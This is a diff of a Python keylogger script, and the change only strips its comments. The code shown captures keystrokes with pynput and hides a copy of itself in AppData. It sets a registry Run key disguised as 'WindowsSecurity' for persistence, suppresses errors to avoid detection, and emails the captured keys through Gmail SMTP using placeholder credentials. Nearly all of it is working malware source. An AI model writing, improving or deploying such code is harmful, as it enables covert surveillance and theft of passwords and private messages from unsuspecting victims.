@@ -10,9 +10,9 @@ class Keylogger:
         self.log = ""
         self.email = email
         self.password = password
-        self.key_limit = key_limit  # Send email after 15 keypresses
+        self.key_limit = key_limit
         self.pressed_keys = 0
-        self.become_persistent()  # Ensure it stays on system startup
+        self.become_persistent()
 
     def become_persistent(self):
         """ Hides executable in 'AppData\Roaming\Microsoft' and sets it to run at startup """
@@ -21,13 +21,12 @@ class Keylogger:
         if not os.path.exists(hidden_location):
             try:
                 shutil.copyfile(sys.executable, hidden_location)
-                # Add registry key to make it start at boot
                 subprocess.call(
                     f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecurity /t REG_SZ /d "{hidden_location}"',
                     shell=True
                 )
             except:
-                pass  # Prevent detection
+                pass
 
     def process_key_press(self, key):
         """ Logs the keypress and sends email after 15 keypresses """
@@ -41,7 +40,7 @@ class Keylogger:
 
         if self.pressed_keys >= self.key_limit:
             self.send_mail(self.email, self.password, self.log)
-            self.log = ""  # Clear log after sending
+            self.log = ""
             self.pressed_keys = 0
 
     def send_mail(self, email, password, message):
@@ -53,14 +52,13 @@ class Keylogger:
             server.sendmail(email, email, message)
             server.quit()
         except:
-            pass  # Prevent detection
+            pass
 
     def start(self):
         """ Starts the keylogger """
         with pynput.keyboard.Listener(on_press=self.process_key_press) as listener:
             listener.join()
 
-# Hardcoded credentials
 my_keylogger = Keylogger("youre-email@gmail.com", "your password or Google app key if 2fa is enabled") 
 my_keylogger.start()
 
